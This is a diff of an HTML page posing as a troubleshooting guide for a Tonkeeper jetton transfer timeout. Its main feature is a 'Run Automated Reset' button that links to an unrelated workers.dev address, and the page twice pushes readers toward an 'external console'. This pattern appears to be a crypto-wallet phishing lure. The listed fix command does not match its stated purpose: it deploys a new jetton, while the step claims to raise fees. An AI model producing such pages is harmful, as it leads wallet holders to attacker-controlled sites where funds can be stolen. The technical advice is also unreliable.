@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,33 +41,21 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and potential loss of funds.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, indicating a failure in the transfer process due to a timeout.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper protocol, which is responsible for facilitating jetton transfers. This timeout can be caused by network congestion, high transaction volumes, or issues with the Tonkeeper smart contract.</li>
+<li>The error occurs due to the transfer loop exceeding the maximum allowed time, often resulting from network congestion, high gas fees, or issues with the smart contract governing the jetton transfer.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the transaction timeout threshold</li>
-<li>Implement a retry mechanism for failed transactions</li>
-<li>Update the Tonkeeper smart contract to optimize transaction processing</li>
-</ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider utilizing an external console to execute these commands for more efficient troubleshooting.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Familiarity with the TON ecosystem and its protocols</li>
-<li>Access to the Tonkeeper smart contract code</li>
-<li>Understanding of JSON configuration files and transaction settings</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Increase the gas limit to prioritize the transaction and potentially reduce the timeout risk.</li>
+<li>Adjust the transaction fee to a higher value to incentivize faster processing by validators.
+  <code>bash
+  tonos-cli call &lt;jetton_contract_address&gt; deploy "{\"_name\":\"NewJetton\",\"_symbol\":\"NJT\"}" --abi JettonWallet.abi --keypair ./key.json</code></li>
+<li>Consider executing the transaction during off-peak hours when network congestion is lower.
+You may want to consider using an external console for more complex troubleshooting and to execute the above command.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
